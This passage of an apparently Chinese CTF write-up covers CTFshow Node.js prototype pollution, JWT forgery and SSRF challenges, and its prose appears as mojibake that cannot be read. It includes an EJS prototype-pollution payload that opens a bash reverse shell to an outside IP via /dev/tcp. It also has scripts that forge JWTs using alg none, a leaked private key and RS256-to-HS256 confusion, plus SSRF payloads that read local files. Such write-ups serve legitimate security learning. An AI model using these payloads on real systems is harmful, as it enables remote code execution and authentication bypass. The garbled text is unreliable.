class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;login fail!&#x27;</span>&#125;);  <br>  &#125;<br><br>&#125;);<br><span class="hljs-comment">//app.jså­˜åœ¨ï¼š</span><br>app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>).<span class="hljs-property">__express</span>); <br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-comment">//ejs çš„ renderFile è¿›å…¥ï¼š</span><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">renderFile</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>...<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">tryHandleCache</span>(opts, data, cb);<br>&#125;;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› tryHandleCache å‡½æ•°, å‘ç°ä¸€å®šä¼šè¿›å…¥ handleCache å‡½æ•°ï¼ŒhandleCacheä¸­çš„complie å‡½æ•°å­˜åœ¨æ¸²æŸ“æ‹¼æ¥ï¼š</p><p><img src="/img/ctfshowweb341.png" alt="ctfshowweb341"></p><p>æ‰€ä»¥ä¸ç®¡å‰é¢ç»™æ²¡ç»™è¿™ä¸ª<code>outputFunctionName</code>èµ‹å€¼ï¼Œé€šè¿‡åŸå‹é“¾æ±¡æŸ“è¿›è¡Œå˜é‡è¦†ç›–æŠŠå®ƒå¼„æˆæ¶æ„ä»£ç å°±æˆ(æ³¨æ„è¯­å¥å‰åçš„æ‹¼æ¥ï¼Œæ±¡æŸ“ä¸¤çº§)ã€‚</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule..constructor._load(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.135.4.198/9001 0&gt;&amp;1\&quot;&#x27;</span>);<span class="hljs-comment">//&quot;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>[GYCTF2020]Ez_Expressæ˜¯å’Œè¿™é¢˜ä¸€æ ·çš„è€ƒç‚¹ã€‚</p><h3 id="CTFshow-nodejs-web344"><a href="#CTFshow-nodejs-web344" class="headerlink" title="[CTFshow nodejs]web344"></a>[CTFshow nodejs]web344</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">url</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/8c|2c|\,/ig</span>))&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">query</span>);<br>  <span class="hljs-keyword">if</span>(query.<span class="hljs-property">name</span>===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="hljs-property">password</span>===<span class="hljs-string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="hljs-property">isVIP</span>===<span class="hljs-literal">true</span>)&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>);<br>  &#125;<br><br>&#125;);<br></code></pre></td></tr></table></figure><p><code>JSON.parse(req.query.query)</code>ç”¨æ¥è§£æHTTPè¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ã€‚æ¯”å¦‚å¯¹äºï¼š<code>http://example.com/?name=John&amp;age=30</code>ï¼Œ<code>req.query</code> å°†ä¼šæ˜¯ <code>&#123; name: &#39;John&#39;, age: &#39;30&#39; &#125;</code>ã€‚<code>req.query.query</code>æ„æ€æ˜¯è§£æè¯·æ±‚ä¸­åä¸º <code>query</code> çš„æŸ¥è¯¢å‚æ•°çš„å€¼ã€‚</p><p>æ‰€ä»¥ç›´æ¥:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?q</span>uery=&#123;<span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;ctfshow&quot;</span></span>,<span class="hljs-string">&quot;isVIP&quot;</span><span class="hljs-symbol">:true</span>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ³¨æ„é¢˜ç›®ä¸­è¿‡æ»¤äº†<code>2c</code>å’Œ<code>,</code>(%2cå¯¹åº”urlç¼–ç ä¸­çš„,)ã€‚æ‰€ä»¥è¦åˆ©ç”¨ä¸€ä¸‹nodejsçš„ç‰¹æ€§ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?q</span>uery=&#123;<span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span>&amp;query=<span class="hljs-string">&quot;password&quot;</span></span><span class="hljs-symbol">:<span class="hljs-string">&quot;%63tfshow&quot;</span>&amp;query=<span class="hljs-string">&quot;isVIP&quot;</span></span><span class="hljs-symbol">:true</span>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>node.jså¤„ç†req.query.queryçš„æ—¶å€™ï¼Œå®ƒä¸åƒphpé‚£æ ·ï¼Œåé¢getä¼ çš„queryå€¼ä¼šè¦†ç›–å‰é¢çš„ï¼Œè€Œæ˜¯ä¼šæŠŠè¿™äº›å€¼éƒ½æ”¾è¿›ä¸€ä¸ªæ•°ç»„ä¸­ã€‚è€ŒJSON.parseä¼šæŠŠæ•°ç»„ä¸­çš„å­—ç¬¦ä¸²éƒ½æ‹¼æ¥åˆ°ä¸€èµ·ï¼Œå†çœ‹æ»¡ä¸æ»¡è¶³æ ¼å¼ï¼Œæ»¡è¶³å°±è¿›è¡Œè§£æï¼Œå› æ­¤è¿™æ ·åˆ†å¼€æ¥ä¼ å°±å¯ä»¥ç»•è¿‡é€—å·äº†ã€‚æ³¨æ„cè¦è¿›è¡Œurlç¼–ç æˆ%63,ï¼ˆå› ä¸ºä¼šå’Œå‰é¢çš„%22(åŒå¼•å·çš„URLç¼–ç )ç»„æˆ%22c)ã€‚</p></blockquote><h3 id="å°æ€»ç»“ï¼š"><a href="#å°æ€»ç»“ï¼š" class="headerlink" title="å°æ€»ç»“ï¼š"></a>å°æ€»ç»“ï¼š</h3><p>ctfshowä¸Šä¸»è¦çš„é¢˜å‹å°±æ˜¯åŸå‹é“¾æ±¡æŸ“&#x2F;åŸå‹é“¾æ±¡æŸ“ç„¶åRCEã€‚åŸå‹é“¾æ±¡æŸ“çš„è¯ä¸ªäººç†è§£å°±æ˜¯é€šè¿‡åˆ©ç”¨åŸå‹ç»§æ‰¿æœºåˆ¶ä¿®æ”¹å¯¹è±¡åŸå‹æ£é¼“å‡ºæŸäº›æœ¬æ¥ä¸åº”è¯¥å­˜åœ¨çš„å€¼(åˆ©ç”¨__proto__åŠç±»ä¼¼merge&#x2F;cloneå‡½æ•°)ã€‚æœ‰äº›é¢˜å¯èƒ½ä¼šæŠŠ__proto__è¿‡æ»¤æ‰ï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨<code>constructor.prototype</code>ç»•è¿‡å¯¹ <code>__proto__</code> çš„è¿‡æ»¤ã€‚</p><p>è¿˜æœ‰å°±æ˜¯nodejsè¿™ä¸œè¥¿ä¹Ÿå­˜åœ¨ç±»ä¼¼phpä¹‹ç±»çš„é—®é¢˜:å­˜åœ¨å¼±ç±»å‹å’Œä½¿ç”¨æ•°ç»„ç»•è¿‡hashåŠ å¯†ã€‚</p><h3 id="CTFshow-jwt-web345"><a href="#CTFshow-jwt-web345" class="headerlink" title="[CTFshow jwt]web345"></a>[CTFshow jwt]web345</h3><p>ä¸€äº›JWTçš„å‰ç½®çŸ¥è¯†ï¼š<a href="https://mayi077.gitee.io/2020/05/19/JSON-Web-Token%EF%BC%88JWT%EF%BC%89%E5%8E%9F%E7%90%86%E5%8F%8A%E7%94%A8%E6%B3%95/">å‚è€ƒèµ„æ–™</a></p><p>æŠ“åŒ…å‘ç°JWTåªæœ‰ä¸¤éƒ¨åˆ†ï¼Œè€Œä¸”ç®—æ³•ä¸ºnoneï¼š</p><p><img src="/img/ctfshowweb3451.png" alt="ctfshowweb3451"></p><p>é‚£å°±ä¸ç”¨ç®¡ç¬¬ä¸‰éƒ¨åˆ†äº†ï¼Œç¬¬ä¸€éƒ¨åˆ†ä¿ç•™ç¬¬äºŒéƒ¨åˆ†æŠŠ<code>sub</code>å­—æ®µæ”¹æˆ<code>admin</code>åå³å¯ã€‚</p><p>(ä¸çŸ¥é“ä¸ºå•¥å‡ºä¸æ¥flagï¼Œçœ‹ç½‘ä¸Šå…¶å®ƒå¸ˆå‚…ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜ã€‚æŠŠç¬¬ä¸€éƒ¨åˆ†åˆ æ‰æ‰å‡ºflagã€‚)</p><h3 id="CTFshow-jwt-web346"><a href="#CTFshow-jwt-web346" class="headerlink" title="[CTFshow jwt]web346"></a>[CTFshow jwt]web346</h3><p>è¿™æ¬¡çš„jwtå­˜åœ¨ä¸‰éƒ¨åˆ†ï¼š</p><p><img src="/img/ctfshowweb3461.png" alt="ctfshowweb3461"></p><p>åˆ©ç”¨ç©ºåŠ å¯†ç®—æ³•è¿›è¡Œæ”»å‡»<a href="https://xz.aliyun.com/t/6776?time__1311=n4+xnD0DRDyDgDIoEDlhAeK+xxBDjxAKoXtx&alichlgref=https://www.google.com/">å‚è€ƒèµ„æ–™</a></p><p>åˆ æ‰signatureå­—æ®µï¼Œç„¶åä¿®æ”¹<code>alg</code>ä¸ºnone,subå­—æ®µä¸ºadminå³å¯ã€‚</p><p>ä¸¤ä¸ªè¦æ³¨æ„çš„ç‚¹ï¼š</p><blockquote><p>ç»“å°¾çš„.åˆ«çœç•¥ã€‚</p><p>Base64ä¸­æœ‰<code>+</code>ã€ <code>/</code>ã€ <code>=</code> ä¸‰ä¸ªå­—ç¬¦ï¼Œåœ¨base64URLä¸­ï¼Œ<code>=</code> ä¼šè¢«çœç•¥æ‰ã€<code>+</code> ä¼šè¢«æ›¿æ¢ä¸º <code>-</code> ã€<code>/</code> æ›¿æ¢ä¸º <code>_</code>ã€‚</p></blockquote><p>æ‰¾ä¸ªbase64ç½‘ç«™æ‰‹åŠ¨æ”¹ä¹Ÿè¡Œï¼Œè„šæœ¬æ”¹ä¹Ÿè¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>header = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br>payload=&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1707386440</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1707393640</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1707386440</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;13de6961b596e827865157eb5b80d411&quot;</span><br>&#125;<br><br><br>token = jwt.encode(<br>    payload=payload,<br>    key=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment"># å¯†é’¥</span><br>    algorithm=<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-comment"># åŠ å¯†æ–¹å¼</span><br>    headers=header<br>)<br><br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><h3 id="CTFshow-jwt-web347"><a href="#CTFshow-jwt-web347" class="headerlink" title="[CTFshow jwt]web347"></a>[CTFshow jwt]web347</h3><p>jwt-crackerçˆ†ç ´ï¼š</p><p>123456</p><p>å¾—åˆ°å¯†é’¥ç›´æ¥åœ¨jwt.ioä¸Šä¿®æ”¹å°±è¡Œã€‚</p><h3 id="CTFshow-jwt-web348"><a href="#CTFshow-jwt-web348" class="headerlink" title="[CTFshow jwt]web348"></a>[CTFshow jwt]web348</h3><p>åŒä¸Šã€‚</p><h3 id="CTFshow-jwt-web349"><a href="#CTFshow-jwt-web349" class="headerlink" title="[CTFshow jwt]web349"></a>[CTFshow jwt]web349</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//public//private.key&#x27;</span>);<br>  <span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)&#123;<br><span class="hljs-keyword">var</span> flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-keyword">var</span> auth = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">auth</span>;<br><span class="hljs-keyword">var</span> cert = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//public/public.key&#x27;</span>);  <span class="hljs-comment">// get public key</span><br>jwt.<span class="hljs-title function_">verify</span>(auth, cert, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, decoded</span>) &#123;<br>  <span class="hljs-keyword">if</span>(decoded.<span class="hljs-property">user</span>===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;you are not admin&#x27;</span>);<br>  &#125;<br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ç§é’¥åŠ å¯†ç„¶åå…¬é’¥è§£å¯†ï¼Œç„¶åå…¬é’¥ç§é’¥å…¨ç»™äº†ï¼šæ‰€ä»¥åªè¦æ‹¿åˆ°ç§é’¥åè‡ªå·±åŠ å¯†ä¸€ä¸‹å°±è¡Œã€‚ç®—æ³•çš„è¯æ˜¯<code>RS256</code></p><blockquote><p>RS256 (é‡‡ç”¨SHA-256 çš„ RSA  ç­¾å) æ˜¯ä¸€ç§éå¯¹ç§°ç®—æ³•, å®ƒä½¿ç”¨å…¬å…±&#x2F;ç§é’¥å¯¹: æ ‡è¯†æä¾›æ–¹é‡‡ç”¨ç§é’¥ç”Ÿæˆç­¾å, JWT çš„ä½¿ç”¨æ–¹è·å–å…¬é’¥ä»¥éªŒè¯ç­¾åã€‚ç”±äºå…¬é’¥ (ä¸ç§é’¥ç›¸æ¯”)  ä¸éœ€è¦ä¿æŠ¤, å› æ­¤å¤§å¤šæ•°æ ‡è¯†æä¾›æ–¹ä½¿å…¶æ˜“äºä½¿ç”¨æ–¹è·å–å’Œä½¿ç”¨ (é€šå¸¸é€šè¿‡ä¸€ä¸ªå…ƒæ•°æ®URL)ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>payload=&#123;<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="hljs-string">&#x27;RS256&#x27;</span>))<br><span class="hljs-comment"># python2è¿è¡Œ</span><br></code></pre></td></tr></table></figure><h3 id="CTFshow-jwt-web350"><a href="#CTFshow-jwt-web350" class="headerlink" title="[CTFshow jwt]web350"></a>[CTFshow jwt]web350</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//routes/private.key&#x27;</span>);<br>  <span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><br>  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)&#123;<br><span class="hljs-keyword">var</span> flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-keyword">var</span> auth = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">auth</span>;<br><span class="hljs-keyword">var</span> cert = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//routes/public.key&#x27;</span>);  <span class="hljs-comment">// get public key</span><br>jwt.<span class="hljs-title function_">verify</span>(auth, cert,<span class="hljs-keyword">function</span>(<span class="hljs-params">err, decoded</span>) &#123;<br>  <span class="hljs-keyword">if</span>(decoded.<span class="hljs-property">user</span>===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;you are not admin&#x27;</span>+err);<br>  &#125;<br>&#125;);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡ç§é’¥æˆ‘ä»¬æ‹¿ä¸åˆ°äº†ï¼Œåªèƒ½ä¸‹è½½å…¬é’¥ã€‚è¿™æ—¶å¯ä»¥è€ƒè™‘ä¿®æ”¹éå¯¹ç§°åŠ å¯†ç®—æ³•(RS256)ä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•(HS256)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><h3 id="å°æ€»ç»“ï¼š-1"><a href="#å°æ€»ç»“ï¼š-1" class="headerlink" title="å°æ€»ç»“ï¼š"></a>å°æ€»ç»“ï¼š</h3><p>è¿™ç©æ„å„¿ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>header</code>.<code>payload</code>.<code>signature</code>ã€‚æ¯éƒ¨åˆ†åˆ©ç”¨<code>Base64URL</code>ç¼–ç ä¹‹åå†<code>.</code>è¿æ¥ã€‚è§£é¢˜æ€è·¯çš„è¯å°±æ˜¯é€šè¿‡ä¿®æ”¹åŠ å¯†ç®—æ³•(æ¯”å¦‚æ”¹æˆnoneï¼Œä½†æ³¨æ„æ”¹å®Œäº†<code>signature</code>å‰é¢é‚£ä¸ªå°æ•°ç‚¹åˆ«å¿˜åŠ )æˆ–è€…æ‹¿åˆ°å…¬é’¥&#x2F;ç§é’¥åè¿›è¡Œä¼ªé€ ã€‚</p><h3 id="CTFshow-SSRF-web351"><a href="#CTFshow-SSRF-web351" class="headerlink" title="[CTFshow SSRF]web351"></a>[CTFshow SSRF]web351</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><blockquote><p>url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>æˆ–è€…<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p></blockquote><h3 id="CTFshow-SSRF-web352"><a href="#CTFshow-SSRF-web352" class="headerlink" title="[CTFshow SSRF]web352"></a>[CTFshow SSRF]web352</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> 